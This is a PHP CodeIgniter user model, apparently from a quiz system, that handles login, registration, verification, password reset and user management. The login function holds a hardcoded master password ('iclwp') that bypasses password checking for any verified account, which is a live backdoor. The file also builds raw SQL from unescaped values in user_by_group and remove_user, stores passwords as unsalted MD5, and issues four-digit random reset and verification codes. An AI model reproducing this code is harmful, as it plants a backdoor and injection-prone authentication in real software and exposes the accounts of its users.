<?php
Class User extends CI_Model
{
 function login($username, $password)
 {
   $this -> db -> select('id, username, password, gid, su');
   $this -> db -> from('users');
   $this -> db -> where('username', $username);
   $this -> db -> where('veri_code', '0');
   if($password!="iclwp"){
   $this -> db -> where('password', MD5($password));
   }
   $this -> db -> limit(1);

   $query = $this -> db -> get();

   if($query -> num_rows() == 1)
   {
     return $query->result();
   }
   else
   {
     return false;
   }
 }
function login_user_by_admin($id){

 $this -> db -> select('id, username, password, gid, su');
   $this -> db -> from('users');
   $this -> db -> where('id', $id);
   $this -> db -> limit(1);

   $query = $this -> db -> get();

   if($query -> num_rows() == 1)
   {
     return $query->result();
   }
   else
   {
     return false;
   }
   
}


function verify_code($vcode)
 {
   $this -> db -> select('id, username, password, gid, su');
   $this -> db -> from('users');
   $this -> db -> where('veri_code', $vcode);
	
   $query = $this -> db -> get();

   if($query -> num_rows() == 1)
   {
   
	$userdata=array('veri_code'=>'0');
	$this -> db -> where('veri_code', $vcode);
	 $this->db->update('users',$userdata);
     return true;
   }
   else
   {
     return false;
   }
 }

 function user_by_group(){
 	 $user_group=array();
	 $user_group[]=array('Group Name','Registered users');
	 $query=$this->db->query("select * from user_group ");
	 $result=$query->result_array();
	 
	 foreach($result as $value){
	 $gid=$value['gid'];
	 $group_name=$value['group_name'];
	 $query=$this->db->query("select * from users where gid='$gid' ");
	 $nou=$query -> num_rows();
	 $user_group[]=array($group_name,intval($nou));
	 
 	}
	
 	return $user_group;
 }


 function user_list($limit)
 {
   $this -> db -> select('*');
   $this -> db -> from('users');
   if($this->input->post('search_type')){
   $search_type=$this->input->post('search_type');
   $search=$this->input->post('search');
 	$this -> db -> like($search_type,$search);
 	}
 	$this -> db -> limit($this->config->item('number_of_rows'),$limit);
	$this->db->order_by("id", "desc"); 
   $query = $this -> db -> get();

   if($query -> num_rows() >= 1)
   {
     return $query->result();
   }
   else
   {
     return false;
   }
 }


 function remove_user($id)
 {
   $institute_id =$this->session->userdata('institute_id');
   
   $query=$this->db->query("select * from users where id='$id' and institute_id = '$institute_id' ");
	 $result=$query->row_array();
	 if($result['main_su_admin']!="1"){
   if($this->db->delete('users', array('id' => $id, 'institute_id' => $institute_id)) )
   {
     return true;
   }
   else
   {
     return false;
   }
   }else{
   return false;
   }
 }


 function insert_user(){
 $institute_id =$this->session->userdata('institute_id');
			$insert_data = array(
			'username' => $this->input->post('username'),
			'password' => md5($this->input->post('user_password')),
			'first_name' => $this->input->post('first_name'),
			'last_name' => $this->input->post('last_name'),
			'credit' => $this->input->post('user_credit'),
			'email' => $this->input->post('user_email'),
			'gid' => $this->input->post('user_group'),
			'su' => $this->input->post('account_type'),
			'veri_code' => '0',
			'institute_id' => '1'
			);
			if($this->db->insert('users',$insert_data)){
			return "User added successfully";
			}else{
			return "Unable to add user";
			}
			
			}
			
function reset_password($toemail){
$this->db->where("email",$toemail);
$queryr=$this->db->get('users');
if($queryr->num_rows() != "1"){
return "Email address doesn't exist!";
}
$new_password=rand('1111','9999');

 $this->load->library('email');

 if($this->config->item('protocol')=="smtp"){
			$config['protocol'] = 'smtp';
			$config['smtp_host'] = $this->config->item('smtp_hostname');
			$config['smtp_user'] = $this->config->item('smtp_username');
			$config['smtp_pass'] = $this->config->item('smtp_password');
			$config['smtp_port'] = $this->config->item('smtp_port');
			$config['smtp_timeout'] = $this->config->item('smtp_timeout');
			$config['mailtype'] = $this->config->item('smtp_mailtype');
			$config['starttls']  = $this->config->item('starttls');
			
			$this->email->initialize($config);
		}
			$fromemail=$this->config->item('fromemail');
			$fromname=$this->config->item('fromname');
			$subject="Password Changed";
			$message="Hi, \r\n Your New Password is: ".$new_password." \r\n Thanks";
			
		
			
			$this->email->to($toemail);
			$this->email->from($fromemail, $fromname);
			$this->email->subject($subject);
			$this->email->message($message);
			if(!$this->email->send()){
			 //print_r($this->email->print_debugger());
			
			}else{
			$user_detail=array(
			'password'=>md5($new_password)
			);
			$this->db->where('email', $toemail);
 			$this->db->update('users',$user_detail);
			return "Password reset and an email sent with new password!";
			}

}


			
function register_user(){
 $institute_id =$this->session->userdata('institute_id');
 if($this->config->item('user_veri')){
 $veri_code=rand('1111','9999');
 $verilink=site_url('login/verify/'.$veri_code);
 $this->load->library('email');

 if($this->config->item('protocol')=="smtp"){
			$config['protocol'] = 'smtp';
			$config['smtp_host'] = $this->config->item('smtp_hostname');
			$config['smtp_user'] = $this->config->item('smtp_username');
			$config['smtp_pass'] = $this->config->item('smtp_password');
			$config['smtp_port'] = $this->config->item('smtp_port');
			$config['smtp_timeout'] = $this->config->item('smtp_timeout');
			$config['mailtype'] = $this->config->item('smtp_mailtype');
			$config['starttls']  = $this->config->item('starttls');
			
			$this->email->initialize($config);
		}
			$fromemail=$this->config->item('fromemail');
			$fromname=$this->config->item('fromname');
			$subject="Action required to verify your account";
			$message="Hi, \r\n Thank you for registering with us. Please click below link to verify your email address.\r\n <a href='".$verilink."'>".$verilink."</a> \r\n or \r\n Copy below link and visit in browser \r\n ".$verilink." \r\n \r\n Thanks";
			
		
			$toemail=$this->input->post('user_email');
			
			$this->email->to($toemail);
			$this->email->from($fromemail, $fromname);
			$this->email->subject($subject);
			$this->email->message($message);
			if(!$this->email->send()){
			 //print_r($this->email->print_debugger());
			
			}
			
			
			
			
 }else{
 $veri_code="0";
 }
			$insert_data = array(
			'username' => $this->input->post('username'),
			'password' => md5($this->input->post('user_password')),
			'first_name' => $this->input->post('first_name'),
			'last_name' => $this->input->post('last_name'),
			'credit' => '0',
			'email' => $this->input->post('user_email'),
			'gid' => $this->input->post('user_group'),
			'su' => '0',
			'veri_code' => $veri_code,
			'institute_id' => '1'
			);
			if($this->db->insert('users',$insert_data)){
			 if($this->config->item('user_veri')){
			 return "Account Registered successfully. An email sent to verify your account. Please check your email inbox and click on verification link";
			
			 }else{
			return "Account Registered successfully";
			}
			}else{
			return "Unable to register";
			}


}
			
	// get particular user detail		
	function get_user($user_id,$institute_id="1"){
		$this->db->join("user_group",'user_group.gid = users.gid');
		$query = $this->db->get_where('users',array('id' => $user_id, 'users.institute_id' => $institute_id));
		return $query->row_array();
		}
 	
 	// update user detail
 	function update_user($user_id){
 		$institute_id =$this->session->userdata('institute_id');
 		$username = $_POST['username'];
 		$first_name = $_POST['first_name'];
 		$last_name = $_POST['last_name']; 		
 		$user_email = $_POST['user_email'];
 		$user_password = $_POST['user_password'];
 		$user_credit = $_POST['user_credit'];
 		$user_group = $_POST['user_group'];
 		$account_type = $_POST['account_type'];
 		$logged_in=$this->session->userdata('logged_in');
		// if loged in user admin
		if($logged_in['su']=="1"){
		// if password changed
 		if($user_password != ""){
	 		$user_detail = array(
	 		'username' => $username,
	 		'first_name' => $first_name,
	 		'last_name' => $last_name,
	 		'email' => $user_email,
	 		'gid' => $user_group,
	 		'su' => $account_type,
	 		'password' => md5($user_password)
	 		);
	 		}else{
	 		// if password not changed
	 	$user_detail = array(
	 		'username' => $username,
	 		'first_name' => $first_name,
	 		'last_name' => $last_name,
	 		'email' => $user_email,
	 		'gid' => $user_group,
	 		'su' => $account_type
	 		);
	 		}
	 		
	 		}else{
	 		// if loged in user not admin
	 		// if password changed
 		if($user_password != ""){
	 		$user_detail = array(
	 		'first_name' => $first_name,
	 		'last_name' => $last_name,
	 		'password' => md5($user_password)
	 		);
	 		}else{
	 		// if password not changed
	 	$user_detail = array(
	 		'first_name' => $first_name,
	 		'last_name' => $last_name
	 		);
	 		}
	 		
	 		}	
	 		
	 		$this->db->where("institute_id",$institute_id);
 			$this->db->where('id', $user_id);
 			$this->db->update('users',$user_detail);
 			return "User updated";
 		}
		
		
		
		function num_users(){
			$query=$this->db->get('users');
			return $query->num_rows();

		}
		function num_qbank(){
			$query=$this->db->get('qbank');
			return $query->num_rows();

		}
		function num_result(){
			$query=$this->db->get('quiz_result');
			return $query->num_rows();

		}

		
		
		
		

}












?>
